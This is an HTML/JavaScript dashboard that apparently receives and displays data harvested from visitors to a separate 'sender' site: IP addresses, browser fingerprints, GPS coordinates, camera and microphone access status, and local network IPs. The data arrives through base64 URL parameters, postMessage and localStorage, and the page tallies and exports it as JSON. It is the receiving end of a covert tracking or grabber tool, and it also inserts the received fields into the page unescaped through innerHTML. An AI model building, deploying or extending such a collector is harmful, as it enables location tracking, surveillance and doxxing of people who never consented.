<!DOCTYPE html>
<html>
<head>
    <title>Data Collection Receiver</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            min-height: 100vh;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 15px;
        }
        .data-card {
            background: rgba(255, 255, 255, 0.1);
            margin: 15px 0;
            padding: 20px;
            border-radius: 10px;
            border-left: 4px solid #4CAF50;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .stat-card {
            background: rgba(255, 255, 255, 0.2);
            padding: 15px;
            border-radius: 10px;
            text-align: center;
        }
        pre {
            background: rgba(0, 0, 0, 0.5);
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            font-size: 12px;
            max-height: 400px;
            overflow-y: auto;
        }
        .connection-status {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 10px 20px;
            background: #4CAF50;
            border-radius: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="connection-status" id="connectionStatus">🟢 Connected</div>
    
    <div class="container">
        <h1>📊 Data Collection Receiver</h1>
        <p>Live data received from sender website</p>

        <div class="stats">
            <div class="stat-card">
                <h3>Total Received</h3>
                <div id="totalReceived">0</div>
            </div>
            <div class="stat-card">
                <h3>Last Received</h3>
                <div id="lastReceived">Never</div>
            </div>
            <div class="stat-card">
                <h3>IP Addresses</h3>
                <div id="uniqueIPs">0</div>
            </div>
            <div class="stat-card">
                <h3>Locations</h3>
                <div id="locationsCount">0</div>
            </div>
        </div>

        <div class="data-card">
            <h3>🌐 Live Data Stream</h3>
            <button onclick="clearData()" style="background: #ff9800;">Clear All Data</button>
            <button onclick="exportData()" style="background: #2196F3;">Export JSON</button>
            <div id="liveData">
                <p>Waiting for data from sender...</p>
            </div>
        </div>

        <div class="data-card">
            <h3>📋 Received Data Log</h3>
            <pre id="dataLog">No data received yet.</pre>
        </div>

        <div id="receivedData" style="display: none;"></div>
    </div>

    <script>
        let receivedData = [];
        let uniqueIPs = new Set();
        let totalReceived = 0;

        // Function to handle incoming data
        function handleIncomingData(payload) {
            totalReceived++;
            uniqueIPs.add(payload.data.basicInfo.ip);
            
            // Update stats
            document.getElementById('totalReceived').textContent = totalReceived;
            document.getElementById('lastReceived').textContent = new Date().toLocaleTimeString();
            document.getElementById('uniqueIPs').textContent = uniqueIPs.size;
            document.getElementById('locationsCount').textContent = 
                receivedData.filter(d => d.data.location.latitude).length;

            // Add to received data array
            receivedData.push(payload);
            
            // Update live display
            updateLiveDisplay(payload);
            
            // Update data log
            updateDataLog();
            
            // Store in localStorage
            localStorage.setItem('receivedData', JSON.stringify(receivedData));
        }

        function updateLiveDisplay(payload) {
            const liveData = document.getElementById('liveData');
            const data = payload.data;
            
            const display = `
                <div style="border: 2px solid #4CAF50; padding: 15px; margin: 10px 0; border-radius: 10px;">
                    <h4>📨 New Data Received - ${new Date().toLocaleTimeString()}</h4>
                    <p><strong>IP:</strong> ${data.basicInfo.ip}</p>
                    <p><strong>User Agent:</strong> ${data.basicInfo.fingerprint.userAgent.substring(0, 50)}...</p>
                    ${data.location.latitude ? 
                        `<p><strong>📍 Location:</strong> ${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)}</p>` : 
                        '<p><strong>📍 Location:</strong> Not provided</p>'
                    }
                    <p><strong>📷 Media Access:</strong> ${data.mediaAccess.camera ? '✅ Camera' : '❌ Camera'} | ${data.mediaAccess.microphone ? '✅ Mic' : '❌ Mic'}</p>
                    <p><strong>🌐 Local IP:</strong> ${data.networkInfo.localIP || 'Unknown'}</p>
                    <button onclick="viewDetails(${receivedData.length - 1})">View Full Details</button>
                </div>
            `;
            
            liveData.innerHTML = display + liveData.innerHTML;
        }

        function updateDataLog() {
            const log = document.getElementById('dataLog');
            log.textContent = JSON.stringify(receivedData, null, 2);
        }

        function viewDetails(index) {
            const data = receivedData[index];
            alert(JSON.stringify(data, null, 2));
        }

        function clearData() {
            receivedData = [];
            uniqueIPs = new Set();
            totalReceived = 0;
            localStorage.removeItem('receivedData');
            
            document.getElementById('totalReceived').textContent = '0';
            document.getElementById('lastReceived').textContent = 'Never';
            document.getElementById('uniqueIPs').textContent = '0';
            document.getElementById('locationsCount').textContent = '0';
            document.getElementById('liveData').innerHTML = '<p>Waiting for data from sender...</p>';
            document.getElementById('dataLog').textContent = 'No data received yet.';
        }

        function exportData() {
            const dataStr = JSON.stringify(receivedData, null, 2);
            const dataBlob = new Blob([dataStr], {type: 'application/json'});
            const url = URL.createObjectURL(dataBlob);
            const link = document.createElement('a');
            link.href = url;
            link.download = `collected-data-${new Date().toISOString().split('T')[0]}.json`;
            link.click();
            URL.revokeObjectURL(url);
        }

        // Check for data in URL parameters (Method 3)
        function checkURLForData() {
            const urlParams = new URLSearchParams(window.location.search);
            const payload = urlParams.get('payload');
            
            if (payload) {
                try {
                    const data = JSON.parse(atob(payload));
                    handleIncomingData(data);
                    
                    // Clean URL
                    window.history.replaceState({}, document.title, window.location.pathname);
                } catch (error) {
                    console.log('Error parsing URL data:', error);
                }
            }
        }

        // Check for data in localStorage (Method 4)
        function checkLocalStorageForData() {
            try {
                const storedData = localStorage.getItem('collectedData');
                if (storedData) {
                    const data = JSON.parse(storedData);
                    handleIncomingData(data);
                    localStorage.removeItem('collectedData');
                }
            } catch (error) {
                console.log('Error reading localStorage data:', error);
            }
        }

        // Simulate API endpoint (Method 1)
        function simulateAPI() {
            // In a real implementation, you'd have a server endpoint
            console.log('API endpoint ready at /api/collect');
        }

        // Listen for messages from sender (Method 2)
        window.addEventListener('message', function(event) {
            // Verify origin for security
            if (event.origin === 'https://your-sender-site.vercel.app') {
                if (event.data.type === 'dataCollection') {
                    handleIncomingData(event.data);
                }
            }
        });

        // Check for data on page load
        window.addEventListener('load', function() {
            checkURLForData();
            checkLocalStorageForData();
            simulateAPI();
            
            // Load previously stored data
            const stored = localStorage.getItem('receivedData');
            if (stored) {
                receivedData = JSON.parse(stored);
                receivedData.forEach(data => {
                    uniqueIPs.add(data.data.basicInfo.ip);
                    totalReceived++;
                });
                updateDataLog();
            }
        });

        // Auto-check for new data every 5 seconds
        setInterval(checkLocalStorageForData, 5000);
    </script>
</body>
</html>
